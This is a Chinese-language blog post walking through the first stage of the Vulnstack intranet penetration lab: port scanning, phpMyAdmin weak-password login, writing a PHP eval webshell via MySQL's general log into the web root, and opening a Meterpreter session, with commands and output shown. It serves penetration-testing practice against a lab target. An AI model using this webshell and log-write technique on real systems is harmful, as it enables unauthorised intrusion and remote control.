---
title: Vulnstack靶机练习（一）
date: 2020-01-12 21:46:37
comments: true
toc: true
categories:
- 红蓝对抗
tags: 
- 靶机
- 域控

---
# **Vulnstack靶机练习（一）**

## **前言**

首先感谢红日安全团队开源的靶机环境，具体的下载地址：
http://vulnstack.qiyuanxuetang.net/vuln/detail/2/

本文基于vulnstack靶机环境来聊聊内网渗透的那些事。

## **本地环境搭建**

kali 攻击机  192.168.54.130

vulnstack-win7 第一层靶机 对外暴漏服务
192.168.54.129
192.168.52.143

vulnstack-Win2K3 域内靶机
192.168.52.141

vulnstack-winserver08 域控主机
192.168.52.138

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200112104940195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)


## **第一层靶机渗透**

假设vulnstack-win7为第一层靶机，并且对外提供服务，攻击者能直接访问该机器暴漏的web服务，攻击者获取了该机器的IP地址192.168.54.129，于是尝试对该主机进行端口探测：

```shell
root@kali:~# nmap -sV -Pn 192.168.54.129
Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-12 11:01 CST
Nmap scan report for 192.168.54.129
Host is up (0.00045s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)
3306/tcp open  mysql   MySQL (unauthorized)
MAC Address: 00:0C:29:EA:57:EC (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.63 seconds
```

发现主机除了暴漏web服务外，还暴露了mysql服务，后台使用windows操作系统，我们先看mysql服务有什么可以利用点

### **mysql服务信息搜集及利用**
扫描一下看mysql服务是否支持外连
```shell
msf5 auxiliary(scanner/mysql/mysql_login) > run

[-] 192.168.54.129:3306   - 192.168.54.129:3306 - Unsupported target version of MySQL detected. Skipping.
[*] 192.168.54.129:3306   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/mysql/mysql_login) > mysql -h 192.168.54.129 -uroot
[*] exec: mysql -h 192.168.54.129 -uroot

ERROR 1130 (HY000): Host '192.168.54.130' is not allowed to connect to this MySQL server
msf5 auxiliary(scanner/mysql/mysql_login) > clear
```
发现无法利用，此路不通另寻别路。

### **Web服务信息搜集及利用**

根据扫描出来的信息
```shell
80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)
```
发现是一个PHP的站点，直接访问：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200112112935160.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)

根据能发现有管php的很多信息，比如已编译模块检测、PHP相关参数等，但是没有发现能直接利用的点，接着尝试扫描一下网站目录，看是否能发现一些其他的有用信息。

发现后台存在phpMyAdmin

```shell
[11:35:09] 200 -   71KB - /phpinfo.php
[11:35:09] 301 -  241B  - /phpmyadmin  ->  http://192.168.54.129/phpmyadmin/
[11:35:09] 301 -  241B  - /phpMyAdmin  ->  http://192.168.54.129/phpMyAdmin/
[11:35:09] 403 -  221B  - /phpMyAdmin.%2A
[11:35:10] 200 -    4KB - /phpMyAdmin/
[11:35:10] 200 -    4KB - /phpmyadmin/
[11:35:10] 200 -    4KB - /phpMyadmin/
[11:35:10] 200 -    4KB - /phpmyAdmin/
```
尝试phpMyAdmin弱口令root登录，发现能成功登录，并且能清楚的看到后台还有一个yxcms, 可尝试使用cms的漏洞getshell。这里我们先尝试使用phpMyAdmin的相关漏洞看能否getshell。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200112173144541.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)

phpMyAdmin利用方式有多种：
+ 直接写入文件getshell
+ 利用日志getshell
+ 利用本地文件包含漏洞getshell

首先尝试写文件，发现无法写文件
```shell
SHOW VARIABLES LIKE '%secure%';
secure_file_priv值为NULL，说明禁止导出。
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200112174117442.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)
再尝试利用日志来获取shell:

第一步手动开启日志

```sql
set global general_log='on';
```

然后 查看是否开启成功

```sql
show variables like "general_log%";
```
设置日志输出的路径
```sql
set global  general_log_file ="C:\\phpStudy\\WWW\\test.php";
```
然后只要执行的语句都会写入到日志文件中，所以我们查询语句
```sql
select "<?php eval($_POST['a']);?>";
```
发现能成功获取shell
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200112180118772.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)
然后利用菜刀连接，上传反弹木马，获取一个meterpreter控制会话：
```shell
msf5 exploit(multi/handler) > run

[*] Started bind TCP handler against 192.168.54.129:4444
[*] Sending stage (206403 bytes) to 192.168.54.129
[*] Meterpreter session 1 opened (192.168.54.130:33269 -> 192.168.54.129:4444) at 2020-01-12 07:39:32 -0500

meterpreter >
meterpreter > dir
Listing: C:\phpStudy
====================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
40777/rwxrwxrwx   0        dir   2019-10-13 04:39:24 -0400  Apache
40777/rwxrwxrwx   0        dir   2019-10-13 04:39:24 -0400  IIS
40777/rwxrwxrwx   4096     dir   2019-10-13 04:39:24 -0400  MySQL
40777/rwxrwxrwx   4096     dir   2019-10-13 04:39:24 -0400  SQL-Front
40777/rwxrwxrwx   4096     dir   2019-10-13 04:39:24 -0400  WWW
40777/rwxrwxrwx   0        dir   2019-10-13 04:39:24 -0400  backup
40777/rwxrwxrwx   0        dir   2019-10-13 04:39:24 -0400  nginx
40777/rwxrwxrwx   4096     dir   2019-10-13 04:39:24 -0400  php
100777/rwxrwxrwx  2471424  fil   2019-10-13 04:39:38 -0400  phpStudy.exe
100666/rw-rw-rw-  113      fil   2019-10-13 04:39:25 -0400  phpStudy官网.url
100666/rw-rw-rw-  522752   fil   2019-10-13 04:39:38 -0400  phpshao.dll
100777/rwxrwxrwx  7168     fil   2020-01-12 07:36:46 -0500  shell.exe
40777/rwxrwxrwx   4096     dir   2019-10-13 04:39:24 -0400  tmp
40777/rwxrwxrwx   4096     dir   2019-10-13 04:39:24 -0400  tools

meterpreter >
```
未完待续
